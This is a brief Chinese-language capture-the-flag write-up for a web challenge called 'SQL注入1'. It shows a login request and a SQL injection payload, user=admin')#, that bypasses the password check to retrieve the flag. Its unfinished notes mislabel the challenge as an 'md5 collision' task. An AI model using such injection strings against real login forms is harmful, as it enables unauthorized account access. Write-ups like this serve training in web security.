### SQL注入1

## 题目

> http://ctf.nuptzj.cn/challenges#SQL%E6%B3%A8%E5%85%A51
>
> 听说你也会注入？ 

## 解答思路

- 需要注意的是需要添加`)`



## 解题步骤

1. 在登录框中输入用户名和密码，post提交，hackbar加载，其数据如下：

   ```http
   user=admin&pw=password
   ```

2. 修改user数据提交，如下

   ```http
   user=admin')#&pw=password
   ```

   得到flag
## 漏洞挖掘思路

- todo

## 自动化解析

- TODO

- 判断题目特征：`web` `php` `md5 collision`
- 设定题目难度等级`level`为simple
- 提交相应符合要求的字符串

